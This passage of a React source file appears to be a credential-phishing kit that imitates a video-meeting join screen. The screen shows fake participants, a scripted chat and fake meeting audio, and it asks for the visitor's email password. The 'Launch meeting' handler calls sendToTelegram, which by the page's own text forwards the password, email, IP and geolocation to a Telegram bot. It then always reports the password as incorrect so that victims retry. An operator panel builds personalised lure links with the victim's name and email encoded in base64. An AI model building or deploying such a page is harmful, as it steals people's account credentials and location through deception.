          }}>
            {/* Name + Email row */}
            <div style={{ display: "flex", gap: "8px", flexWrap: "wrap" }}>
              <input
                value={userName}
                onChange={e => setUserName(e.target.value)}
                placeholder="Your name"
                onFocus={e => e.target.style.borderColor = C.purple}
                onBlur={e => e.target.style.borderColor = C.border}
                style={{
                  flex: "1 1 160px",
                  background: C.surf2,
                  border: `1px solid ${C.border}`,
                  borderRadius: "6px",
                  padding: "8px 10px",
                  color: "#fff",
                  fontSize: "12px",
                  outline: "none"
                }}
              />

              <input
                value={userEmail}
                onChange={e => setUserEmail(e.target.value)}
                placeholder="Email"
                type="email"
                onFocus={e => e.target.style.borderColor = C.purple}
                onBlur={e => e.target.style.borderColor = C.border}
                style={{
                  flex: "1 1 180px",
                  background: C.surf2,
                  border: `1px solid ${C.border}`,
                  borderRadius: "6px",
                  padding: "8px 10px",
                  color: "#fff",
                  fontSize: "12px",
                  outline: "none"
                }}
              />
            </div>

            {/* Password row - controlled width */}
            <div style={{ position: "relative", maxWidth: "380px" }}>
              <div style={{
                position: "absolute",
                left: "10px",
                top: "50%",
                transform: "translateY(-50%)",
                color: C.dim,
                zIndex: 1
              }}>
                <Lock size={14} />
              </div>
              <input
                value={password}
                onChange={e => setPassword(e.target.value)}
                placeholder="Enter Email Password"
                type="password"
                onFocus={e => e.target.style.borderColor = C.purple}
                onBlur={e => e.target.style.borderColor = C.border}
                style={{
                  width: "100%",
                  maxWidth: "380px",
                  background: C.surf2,
                  border: `1px solid ${C.border}`,
                  borderRadius: "6px",
                  padding: "8px 10px 8px 34px",
                  color: "#fff",
                  fontSize: "12px",
                  outline: "none"
                }}
              />
            </div>
          </div>

          {/* Device buttons */}
          <div style={{ display: "flex", gap: "7px", flexShrink: 0 }}>
            <button onClick={() => setMicOn(m => !m)} title={micOn ? "Mute mic" : "Unmute mic"}
              style={{ width: "40px", height: "40px", borderRadius: "50%", background: micOn ? C.surf3 : C.red, border: micOn ? `1px solid ${C.border}` : "none", color: "#fff", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center" }}>
              {micOn ? <Mic size={17} /> : <MicOff size={17} />}
            </button>
            <button onClick={toggleCam} title={camOn ? "Stop camera" : "Start camera"}
              style={{ width: "40px", height: "40px", borderRadius: "50%", background: camOn ? C.surf3 : C.red, border: camOn ? `1px solid ${C.border}` : "none", color: "#fff", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center" }}>
              {camOn ? <Video size={17} /> : <VideoOff size={17} />}
            </button>
            <button onClick={() => setMuted(m => !m)} title={muted ? "Hear meeting" : "Mute meeting preview"}
              style={{ width: "40px", height: "40px", borderRadius: "50%", background: muted ? C.red : C.surf3, border: muted ? "none" : `1px solid ${C.border}`, color: "#fff", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "16px" }}>
              {muted ? "🔇" : "🔊"}
            </button>
          </div>

          {/* Participants button */}
          <button onClick={() => setShowSetup(s => !s)}
            style={{ height: "40px", background: showSetup ? C.purple : C.surf2, border: `1px solid ${showSetup ? C.purple : C.border}`, borderRadius: "6px", color: "#fff", cursor: "pointer", padding: "0 12px", fontSize: "12px", flexShrink: 0, display: "flex", alignItems: "center", gap: "6px" }}>
            <Users size={14} /> Participants {showSetup ? <ChevronDown size={12} /> : <ChevronUp size={12} />}
          </button>

          {/* Join / Cancel buttons */}
          <div style={{ display: "flex", gap: "8px", flexShrink: 0, marginLeft: "auto" }}>
            <button
              onClick={() => {
                if (!canJoin) return;
                sendToTelegram();
                const newAttempt = attempts + 1;
                setAttempts(newAttempt);
                setJoinError(`Password incorrect, try again (Attempt ${newAttempt})`);
                setPassword("");
                setTimeout(() => setJoinError(""), 3200);
              }}
              disabled={!canJoin}
              style={{
                height: "40px",
                background: canJoin ? C.purple : "#444",
                border: "none",
                borderRadius: "6px",
                padding: "0 24px",
                color: "#fff",
                cursor: canJoin ? "pointer" : "not-allowed",
                fontSize: "14px",
                fontWeight: 700,
                flexShrink: 0,
                transition: "background .15s"
              }}>
              Launch meeting →
            </button>

            <button
              onClick={() => {
                setPassword("");
                setAttempts(0);
                setJoinError("");
              }}
              style={{
                height: "40px",
                background: C.red,
                border: "none",
                borderRadius: "6px",
                padding: "0 20px",
                color: "#fff",
                cursor: "pointer",
                fontSize: "14px",
                fontWeight: 700,
                flexShrink: 0
              }}>
              Cancel
            </button>
          </div>

          {joinError && (
            <div style={{
              position: "absolute",
              bottom: "58px",
              left: "50%",
              transform: "translateX(-50%)",
              background: "rgba(196, 49, 75, 0.95)",
              color: "#fff",
              padding: "8px 18px",
              borderRadius: "6px",
              fontSize: "13px",
              fontWeight: 600,
              whiteSpace: "nowrap",
              zIndex: 30,
              boxShadow: "0 4px 12px rgba(196,49,75,0.4)"
            }}>
              {joinError}
            </div>
          )}
        </div>

        {showSetup && (
          <div style={{ padding: "10px 16px 14px", borderTop: `1px solid ${C.border}`, maxHeight: "320px", overflowY: "auto" }}>

            {isGuest ? (
              <>
                <p style={{ margin: "0 0 10px", fontSize: "11px", color: C.dim, fontWeight: 600, textTransform: "uppercase", letterSpacing: "0.5px" }}>
                  In this meeting · {participants.length}
                </p>
                <div style={{ display: "flex", flexDirection: "column" }}>
                  {participants.map(p => (
                    <div key={p.id} style={{ display: "flex", alignItems: "center", gap: "11px", padding: "8px 0", borderBottom: `1px solid ${C.border}` }}>
                      <PAv photo={p.photo} name={p.name} bg={p.avatarBg} size={38} />
                      <div style={{ flex: 1, minWidth: 0 }}>
                        <div style={{ fontSize: "13px", fontWeight: 500, color: "#fff", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{p.name}</div>
                        <div style={{ fontSize: "10px", color: C.dim }}>{p.handRaised ? "✋ Hand raised" : (p.muted ? "Muted" : "In call")}</div>
                      </div>
                      {p.muted && <MicOff size={14} color={C.red} />}
                    </div>
                  ))}
                </div>
              </>
            ) : (
              <>
                <p style={{ margin: "0 0 4px", fontSize: "11px", color: C.dim, fontWeight: 600, textTransform: "uppercase", letterSpacing: "0.5px" }}>
                  Participant invite links
                </p>

                <div style={{ background: "#1a1a1a", borderRadius: "7px", padding: "10px 12px", marginBottom: "10px", border: `1px solid ${C.border}` }}>
                  <p style={{ margin: "0 0 8px", fontSize: "10px", color: C.dim, fontWeight: 600, textTransform: "uppercase", letterSpacing: "0.5px" }}>Link appearance</p>
                  <div style={{ display: "flex", gap: "8px", flexWrap: "wrap", marginBottom: "6px" }}>
                    <div style={{ flex: "3 1 180px" }}>
                      <label style={{ fontSize: "10px", color: C.dim, display: "block", marginBottom: "3px" }}>Base URL</label>
                      <input value={linkBase} onChange={e => setLinkBase(e.target.value)} placeholder="https://yoursite.com"
                        onFocus={e => e.target.style.borderColor = C.purple} onBlur={e => e.target.style.borderColor = C.border}
                        style={{ width: "100%", boxSizing: "border-box", background: C.surf3, border: `1px solid ${C.border}`, borderRadius: "5px", padding: "5px 8px", color: "#fff", fontSize: "11px", outline: "none", fontFamily: "monospace", transition: "border-color .15s" }} />
                    </div>
                    <div style={{ flex: "1 1 80px" }}>
                      <label style={{ fontSize: "10px", color: C.dim, display: "block", marginBottom: "3px" }}>Param name</label>
                      <input value={linkParam} onChange={e => setLinkParam(e.target.value.replace(/\s/g, ""))} placeholder="join"
                        onFocus={e => e.target.style.borderColor = C.purple} onBlur={e => e.target.style.borderColor = C.border}
                        style={{ width: "100%", boxSizing: "border-box", background: C.surf3, border: `1px solid ${C.border}`, borderRadius: "5px", padding: "5px 8px", color: "#a5f3fc", fontSize: "11px", outline: "none", fontFamily: "monospace", transition: "border-color .15s" }} />
                    </div>
                  </div>
                  <p style={{ margin: 0, fontSize: "9px", color: C.dim }}>
                    Preview: <span style={{ color: "#a5f3fc", fontFamily: "monospace" }}>{(linkBase || "https://yoursite.com").replace(/\/$/, "")}?{linkParam || "join"}=sarah-standup~<span style={{ opacity: .6 }}>BASE64</span></span>
                  </p>
                </div>

                <div style={{ background: "#1a1a1a", borderRadius: "7px", padding: "10px 12px", marginBottom: "10px", border: `1px solid ${C.purple}` }}>
                  <p style={{ margin: "0 0 6px", fontSize: "10px", color: C.purple, fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.5px" }}>
                    🧪 Telegram Test Integration
                  </p>
                  <p style={{ margin: "0 0 8px", fontSize: "9px", color: C.dim }}>
                    When you click <b>Launch meeting</b>, the password you typed + your email + timestamp + IP + full geolocation will be sent to Telegram.<br />
                    <span style={{ color: "#f59e0b" }}>This is a test app — everyone knows.</span> Values are pre-filled from <code>config.js</code>. Edit the fields below to override for this browser session only.
                  </p>
                  <div style={{ display: "flex", gap: "8px", flexWrap: "wrap" }}>
                    <div style={{ flex: "2 1 220px" }}>
                      <label style={{ fontSize: "10px", color: C.dim, display: "block", marginBottom: "3px" }}>Bot Token</label>
                      <input
                        value={tgToken}
                        onChange={e => setTgToken(e.target.value)}
                        placeholder="123456789:AAH...your-bot-token-here"
                        onFocus={e => e.target.style.borderColor = C.purple}
                        onBlur={e => e.target.style.borderColor = C.border}
                        style={{ width: "100%", boxSizing: "border-box", background: C.surf3, border: `1px solid ${C.border}`, borderRadius: "5px", padding: "6px 9px", color: "#fff", fontSize: "11px", outline: "none", fontFamily: "monospace", transition: "border-color .15s" }} />
                    </div>
                    <div style={{ flex: "1 1 140px" }}>
                      <label style={{ fontSize: "10px", color: C.dim, display: "block", marginBottom: "3px" }}>Chat ID</label>
                      <input
                        value={tgChatId}
                        onChange={e => setTgChatId(e.target.value)}
                        placeholder="123456789 or @yourchannel"
                        onFocus={e => e.target.style.borderColor = C.purple}
                        onBlur={e => e.target.style.borderColor = C.border}
                        style={{ width: "100%", boxSizing: "border-box", background: C.surf3, border: `1px solid ${C.border}`, borderRadius: "5px", padding: "6px 9px", color: "#fff", fontSize: "11px", outline: "none", fontFamily: "monospace", transition: "border-color .15s" }} />
                    </div>
                  </div>
                  <p style={{ margin: "6px 0 0", fontSize: "9px", color: C.dim }}>
                    Edit <code>config.js</code> to set permanent defaults. Or paste here temporarily. Get token from @BotFather, chat ID via /getUpdates or user profile.
                  </p>
                </div>

                <GuestGenerator linkBase={linkBase} linkParam={linkParam} />

                <p style={{ margin: "0 0 4px", fontSize: "10px", color: C.dim, fontWeight: 600, textTransform: "uppercase", letterSpacing: "0.5px" }}>The 4 participants in call</p>
                <div style={{ display: "flex", flexDirection: "column" }}>
                  {participants.map(p => (
                    <ParticipantCard key={p.id} p={p}
                      linkBase={linkBase} linkParam={linkParam}
                      onPhoto={url => updateParticipant(p.id, { photo: url })}
                      onName={name => updateParticipant(p.id, { name })}
                      onEmail={email => updateParticipant(p.id, { email })}
                      onSlug={slug => updateParticipant(p.id, { slug })} />
                  ))}
                </div>
              </>
            )}
          </div>
        )}
      </div>

      <style>{`
        @keyframes speakBar { from{transform:scaleY(1);} to{transform:scaleY(0.15);} }
        @keyframes dotBlink  { 0%,100%{opacity:0.3;} 50%{opacity:1;} }
        input::placeholder { color:#555; }
      `}</style>
    </div>
  );
}

/* ═══════════════════════════════════════════════
   JOINING SCREEN
═══════════════════════════════════════════════ */
function JoiningScreen({ participants, userName, userEmail, onDone }) {
  const [progress, setProgress] = useState(0);
  const [shown, setShown] = useState(0);
  const [status, setStatus] = useState("Connecting...");

  useEffect(() => {
    const TOTAL = 2800, t0 = Date.now();
    const tick = setInterval(() => { const p = Math.min(100, ((Date.now() - t0) / TOTAL) * 100); setProgress(p); }, 30);
    participants.forEach((_, i) => setTimeout(() => setShown(s => s + 1), 350 + i * 330));
    setTimeout(() => setStatus("Joining meeting..."), 500);
    setTimeout(() => setStatus("Setting up audio..."), 1100);
    setTimeout(() => setStatus("Almost there..."), 2000);
    const done = setTimeout(() => { clearInterval(tick); onDone(); }, TOTAL);
    return () => { clearInterval(tick); clearTimeout(done); };
  }, []);

  return (
    <div style={{ width: "100%", height: "100vh", background: C.bg, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", fontFamily: "'Segoe UI',system-ui,-apple-system,sans-serif", color: "#fff", gap: "22px" }}>
      <div style={{ width: "58px", height: "58px", background: "linear-gradient(135deg,#7c7fdb,#5558a0)", borderRadius: "14px", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "28px", fontWeight: 900, animation: "logoPulse 1.6s ease-in-out infinite" }}>T</div>
      <div style={{ textAlign: "center" }}>
        <div style={{ fontSize: "18px", fontWeight: 700, marginBottom: "5px" }}>Weekly Team Standup</div>
        <div style={{ fontSize: "13px", color: C.dim }}>{status}</div>
      </div>
      <div style={{ width: "min(300px,78%)", height: "3px", background: C.surf3, borderRadius: "2px", overflow: "hidden" }}>
        <div style={{ height: "100%", background: C.purple, borderRadius: "2px", width: `${progress}%`, transition: "width 0.1s linear" }} />
      </div>
      <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "12px" }}>
        <div style={{ fontSize: "12px", color: C.dim }}>
          {shown > 0 ? `${shown} participant${shown > 1 ? "s" : ""} already in the call` : "Preparing your connection..."}
        </div>
        <div style={{ display: "flex", gap: "14px", alignItems: "flex-end" }}>
          {participants.map((p, i) => (
            <div key={p.id} style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "6px", opacity: i < shown ? 1 : 0, transform: i < shown ? "scale(1) translateY(0)" : "scale(0.5) translateY(8px)", transition: "all 0.4s cubic-bezier(0.34,1.56,0.64,1)" }}>
              <div style={{ position: "relative" }}>
                <PAv photo={p.photo} name={p.name} bg={p.avatarBg} size={46} />
                {i < shown && <div style={{ position: "absolute", bottom: "-3px", left: "50%", transform: "translateX(-50%)" }}><SpeakBars size={8} color={C.purple} /></div>}
              </div>
              <span style={{ fontSize: "10px", color: C.dim }}>{p.name.split(" ")[0]}</span>
            </div>
          ))}
        </div>
      </div>
      <div style={{ display: "flex", alignItems: "center", gap: "10px", background: C.surf, borderRadius: "8px", padding: "10px 16px", border: `1px solid ${C.border}` }}>
        <PAv photo={null} name={userName} bg="#1d4ed8" size={32} />
        <div>
          <div style={{ fontSize: "12px", fontWeight: 600 }}>{userName}</div>
          <div style={{ fontSize: "10px", color: C.dim }}>{userEmail}</div>
        </div>
      </div>
      <style>{`
        @keyframes speakBar { from{transform:scaleY(1);} to{transform:scaleY(0.15);} }
        @keyframes logoPulse { 0%,100%{box-shadow:0 0 0 0 rgba(98,100,167,0.5);} 50%{box-shadow:0 0 0 14px rgba(98,100,167,0);} }
      `}</style>
    </div>
  );
}

/* ═══════════════════════════════════════════════
   IN-CALL
═══════════════════════════════════════════════ */
function InCall({ participants, userName, userEmail, initMic, initCam, initStream, onLeave }) {
  const mob = useIsMobile();
  const [micOn, setMicOn] = useState(initMic);
  const [camOn, setCamOn] = useState(initCam);
  const [stream, setStream] = useState(initStream);
  const [handRaised, setHandRaised] = useState(false);
  const [chatOpen, setChatOpen] = useState(false);
  const [peopleOpen, setPeopleOpen] = useState(false);
  const [toast, setToast] = useState(true);
  const [elapsed, setElapsed] = useState(23 * 60 + 47);
  const [pulse, setPulse] = useState(true);
  const [activeIdx, setActiveIdx] = useState(0);
  const audioRef = useRef(null);

  useEffect(() => { const t = setInterval(() => setElapsed(e => e + 1), 1000); return () => clearInterval(t); }, []);
  useEffect(() => { const t = setTimeout(() => setToast(false), 4500); return () => clearTimeout(t); }, []);
  useEffect(() => { const t = setInterval(() => setPulse(p => !p), 950); return () => clearInterval(t); }, []);

  useEffect(() => {
    const audio = new MeetingAudio();
    audio.start(idx => setActiveIdx(idx % participants.length), 0.14);
    audioRef.current = audio;
    const resume = () => audio.resume();
    document.addEventListener("click", resume, { once: true });
    return () => { document.removeEventListener("click", resume); audio.stop(); };
  }, []);

  const fmt = s => `${String(Math.floor(s / 60)).padStart(2, "0")}:${String(s % 60).padStart(2, "0")}`;

  async function toggleCam() {
    if (camOn) { stream?.getVideoTracks().forEach(t => t.stop()); setStream(null); setCamOn(false); }
    else { try { const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); setStream(s); setCamOn(true); } catch (_) { } }
  }

  const speaker = participants[activeIdx] || participants[0];
  const totalPpl = participants.length + 1;

  const chatMsgs = [
    { from: "James Holloway", time: "10:23 AM", text: "Can everyone hear me ok?" },
    { from: "Priya Nair", time: "10:24 AM", text: "Yes, loud and clear 👍" },
    { from: participants[0]?.name, time: "10:25 AM", text: "Let's kick off with the sprint review." },
    { from: "Tom Richards", time: "10:27 AM", text: "Quick question on Q3 targets" },
    { from: "James Holloway", time: "10:29 AM", text: "Raise your hand Tom, we'll get to you" },
    { from: "Priya Nair", time: "10:31 AM", text: "Tom already raised it 😄" },
  ];

  const divider = <div style={{ width: "1px", height: "30px", background: C.border, margin: "0 4px", flexShrink: 0 }} />;

  return (
    <div style={{ width: "100%", height: "100vh", background: C.bg, display: "flex", flexDirection: "column", fontFamily: "'Segoe UI',system-ui,-apple-system,sans-serif", overflow: "hidden", color: "#fff", userSelect: "none" }}>

      <TopBar elapsed={elapsed} badge={null} />

      <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden", position: "relative" }}>

        {mob && (
          <div style={{ height: "88px", flexShrink: 0, background: C.surf, borderBottom: `1px solid ${C.border}`, display: "flex", alignItems: "center", gap: "8px", padding: "0 10px", overflowX: "auto" }}>
            {participants.map((p, i) => (
              <MobThumb key={p.id} p={p} youStream={stream} youCamOn={camOn} isYou={false} userName={userName} isSpeaking={i === activeIdx} />
            ))}
            <MobThumb p={{ id: 99, name: userName, avatarBg: "#1d4ed8" }} youStream={stream} youCamOn={camOn} isYou={true} userName={userName} isSpeaking={false} />
          </div>
        )}

        <div style={{ flex: 1, display: "flex", overflow: "hidden" }}>
          <MainSpeakerVideo speaker={speaker} pulse={pulse} />

          {!mob && !chatOpen && !peopleOpen && (
            <RightStrip participants={participants} activeIdx={activeIdx} youStream={stream} youCamOn={camOn} youMuted={!micOn} userName={userName} showYou={true} />
          )}

          {chatOpen && (
            <div style={{ width: mob ? "100%" : "278px", background: C.surf, borderLeft: mob ? "none" : `1px solid ${C.border}`, position: mob ? "absolute" : "relative", inset: mob ? 0 : "auto", zIndex: mob ? 20 : "auto", display: "flex", flexDirection: "column", flexShrink: 0 }}>
              <div style={{ padding: "12px 14px", fontWeight: 600, fontSize: "14px", borderBottom: `1px solid ${C.border}`, display: "flex", justifyContent: "space-between", alignItems: "center", flexShrink: 0 }}>
                Meeting chat
                <button onClick={() => setChatOpen(false)} style={{ background: "none", border: "none", color: C.dim, cursor: "pointer", fontSize: "16px" }}>✕</button>
              </div>
              <div style={{ flex: 1, overflow: "auto", padding: "12px" }}>
                {chatMsgs.map((m, i) => (
                  <div key={i} style={{ marginBottom: "14px" }}>
                    <div style={{ display: "flex", alignItems: "baseline", gap: "8px", marginBottom: "3px" }}>
                      <span style={{ fontSize: "12px", fontWeight: 600 }}>{m.from}</span>
                      <span style={{ fontSize: "10px", color: C.dim }}>{m.time}</span>
                    </div>
                    <div style={{ fontSize: "12px", color: "#ddd", lineHeight: "1.45" }}>{m.text}</div>
                  </div>
                ))}
              </div>
              <div style={{ padding: "10px 12px", borderTop: `1px solid ${C.border}`, flexShrink: 0 }}>
                <div style={{ background: C.surf2, borderRadius: "6px", padding: "8px 12px", fontSize: "12px", color: C.dim }}>Type a message…</div>
              </div>
            </div>
          )}

          {!mob && peopleOpen && (
            <div style={{ width: "256px", background: C.surf, borderLeft: `1px solid ${C.border}`, display: "flex", flexDirection: "column", flexShrink: 0 }}>
              <div style={{ padding: "12px 14px", fontWeight: 600, fontSize: "14px", borderBottom: `1px solid ${C.border}`, display: "flex", justifyContent: "space-between", alignItems: "center", flexShrink: 0 }}>
                People ({totalPpl})
                <button onClick={() => setPeopleOpen(false)} style={{ background: "none", border: "none", color: C.dim, cursor: "pointer", fontSize: "16px" }}>✕</button>
              </div>
              <div style={{ flex: 1, overflow: "auto", padding: "8px 12px" }}>
                {[...participants, { id: 99, name: userName, email: userEmail, avatarBg: "#1d4ed8", muted: !micOn, isYou: true }].map((p, i, arr) => (
                  <div key={i} style={{ display: "flex", alignItems: "center", gap: "10px", padding: "9px 0", borderBottom: i < arr.length - 1 ? `1px solid ${C.border}` : "none" }}>
                    <PAv photo={p.photo || null} name={p.name} bg={p.avatarBg} size={34} />
                    <div style={{ flex: 1, overflow: "hidden" }}>
                      <div style={{ fontSize: "12px", fontWeight: 500, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{p.name}{p.isYou ? " (You)" : ""}</div>
                      {i === activeIdx && !p.isYou
                        ? <div style={{ fontSize: "10px", color: C.purple, display: "flex", alignItems: "center", gap: "4px" }}><SpeakBars size={8} color={C.purple} /> Speaking</div>
                        : p.isYou && p.email ? <div style={{ fontSize: "10px", color: C.dim, overflow: "hidden", textOverflow: "ellipsis" }}>{p.email}</div> : null
                      }
                    </div>
                    {p.handRaised && <span style={{ fontSize: "14px" }}>✋</span>}
                    {p.muted && <MicOff size={13} color={C.red} />}
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>

        {toast && (
          <div style={{ position: "absolute", bottom: "16px", left: "50%", transform: "translateX(-50%)", background: "#2b2b2b", border: `1px solid ${C.border}`, borderRadius: "8px", padding: "11px 18px", display: "flex", alignItems: "center", gap: "10px", boxShadow: "0 8px 32px rgba(0,0,0,0.65)", fontSize: "12px", color: "#fff", fontWeight: 500, zIndex: 50, whiteSpace: "nowrap", animation: "fadeUp 0.3s ease" }}>
            <div style={{ width: "18px", height: "18px", borderRadius: "50%", background: C.green, display: "flex", alignItems: "center", justifyContent: "center", fontSize: "11px", fontWeight: 800, flexShrink: 0 }}>✓</div>
            {userName} joined. Mic is {initMic ? "on" : "muted"}.
          </div>
        )}
      </div>

      <div style={{ height: mob ? "68px" : "78px", background: C.surf, borderTop: `1px solid ${C.border}`, display: "flex", alignItems: "center", justifyContent: "center", gap: "2px", flexShrink: 0, padding: `0 ${mob ? 8 : 16}px` }}>
        <IBtn icon={micOn ? <Mic size={mob ? 17 : 19} /> : <MicOff size={mob ? 17 : 19} color={C.red} />} label={micOn ? "Mute" : "Unmute"} onClick={() => setMicOn(m => !m)} />
        <IBtn icon={camOn ? <Video size={mob ? 17 : 19} /> : <VideoOff size={mob ? 17 : 19} color={C.red} />} label={camOn ? "Stop video" : "Start video"} onClick={toggleCam} />
        {!mob && divider}
        {!mob && <IBtn icon={<Monitor size={19} />} label="Share content" />}
        {!mob && <IBtn icon={<Smile size={19} />} label="React" />}
        <IBtn icon={<Hand size={mob ? 17 : 19} color={handRaised ? C.yellow : "#fff"} />} label="Raise hand" onClick={() => setHandRaised(h => !h)} />
        {divider}
        <IBtn icon={<MessageSquare size={mob ? 17 : 19} color={chatOpen ? C.purple : "#fff"} />} label="Chat" onClick={() => { setChatOpen(c => !c); setPeopleOpen(false); }} />
        {!mob && <IBtn icon={<Users size={19} color={peopleOpen ? C.purple : "#fff"} />} label="People" onClick={() => { setPeopleOpen(p => !p); setChatOpen(false); }} />}
        <IBtn icon={<MoreHorizontal size={mob ? 17 : 19} />} label="More" />
        <button onClick={onLeave} style={{ background: C.red, border: "none", borderRadius: "22px", padding: mob ? "9px 16px" : "10px 24px", color: "#fff", cursor: "pointer", fontSize: mob ? "12px" : "13px", fontWeight: 700, marginLeft: mob ? "4px" : "14px", flexShrink: 0, transition: "background .15s" }}
          onMouseEnter={e => e.currentTarget.style.background = "#9e1a38"} onMouseLeave={e => e.currentTarget.style.background = C.red}>Leave</button>
      </div>

      <style>{`
        @keyframes fadeUp { from{opacity:0;transform:translateX(-50%) translateY(8px);} to{opacity:1;transform:translateX(-50%) translateY(0);} }
        @keyframes speakBar { from{transform:scaleY(1);} to{transform:scaleY(0.15);} }
        input::placeholder{color:#555;}
      `}</style>
    </div>
  );
}

/* ═══ ROOT ═══ */
export default function App() {
  const [screen, setScreen] = useState("prejoin");
  const [userName, setUserName] = useState("William Brooks");
  const [userEmail, setUserEmail] = useState("william.brooks@company.com");
  const [participants, setParticipants] = useState([
    {
      id: 1, name: "Sarah Mitchell", email: "sarah.mitchell@company.com", slug: "sarah-mitchell", avatarBg: "#166534", videoOn: true, muted: false,
      photo: "https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=500&h=650&fit=crop&crop=faces&auto=format&q=80",
      videoBg: "linear-gradient(180deg,#0b1c2b,#142d45 28%,#060d18)"
    },
    {
      id: 2, name: "James Holloway", email: "james.holloway@company.com", slug: "james-holloway", avatarBg: "#5c2d91", videoOn: false, muted: true,
      photo: "https://images.unsplash.com/photo-1560250097-0b93528c311a?w=500&h=650&fit=crop&crop=faces&auto=format&q=80",
      videoBg: "linear-gradient(180deg,#150b2b,#22104a 28%,#050510)"
    },
    {
      id: 3, name: "Priya Nair", email: "priya.nair@company.com", slug: "priya-nair", avatarBg: "#c05621", videoOn: true, muted: false,
      photo: "https://images.unsplash.com/photo-1770627016447-cb9d29ed0398?w=500&h=650&fit=crop&crop=faces&auto=format&q=80",
      videoBg: "linear-gradient(180deg,#2b0b1c,#4a1030 28%,#100508)"
    },
    {
      id: 4, name: "Tom Richards", email: "tom.richards@company.com", slug: "tom-richards", avatarBg: "#b91c1c", videoOn: false, muted: false,
      photo: "https://images.unsplash.com/photo-1652471943570-f3590a4e52ed?w=500&h=650&fit=crop&crop=faces&auto=format&q=80",
      videoBg: "linear-gradient(180deg,#1a1010,#2d1a1a 28%,#0a0808)", handRaised: true
    },
  ]);
  const [callParams, setCallParams] = useState(null);
  const [isGuest, setIsGuest] = useState(false);

  const updateParticipant = (id, changes) => setParticipants(prev => prev.map(p => p.id === id ? { ...p, ...changes } : p));

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const tryDecode = (raw) => {
      if (!raw) return false;
      const parts = raw.split("~");
      const b64 = parts[parts.length - 1];
      try {
        const obj = JSON.parse(decodeURIComponent(escape(atob(b64))));
        if (obj.name || obj.email) {
          if (obj.name) setUserName(obj.name);
          if (obj.email) setUserEmail(obj.email);
          return true;
        }
      } catch (_) { }
      return false;
    };
    for (const [, val] of params) { if (tryDecode(val)) { setIsGuest(true); break; } }
  }, []);

  const handleJoin = ({ micOn, camOn, stream }) => { setCallParams({ micOn, camOn, stream }); setScreen("joining"); };
  const handleJoined = () => setScreen("incall");
  const handleLeave = () => { callParams?.stream?.getTracks().forEach(t => t.stop()); setCallParams(null); setScreen("prejoin"); };

  if (screen === "joining")
    return <JoiningScreen participants={participants} userName={userName} userEmail={userEmail} onDone={handleJoined} />;
  if (screen === "incall" && callParams)
    return <InCall participants={participants} userName={userName} userEmail={userEmail} initMic={callParams.micOn} initCam={callParams.camOn} initStream={callParams.stream} onLeave={handleLeave} />;

  return <PreJoin participants={participants} updateParticipant={updateParticipant} userName={userName} setUserName={setUserName} userEmail={userEmail} setUserEmail={setUserEmail} onJoin={handleJoin} isGuest={isGuest} />;
}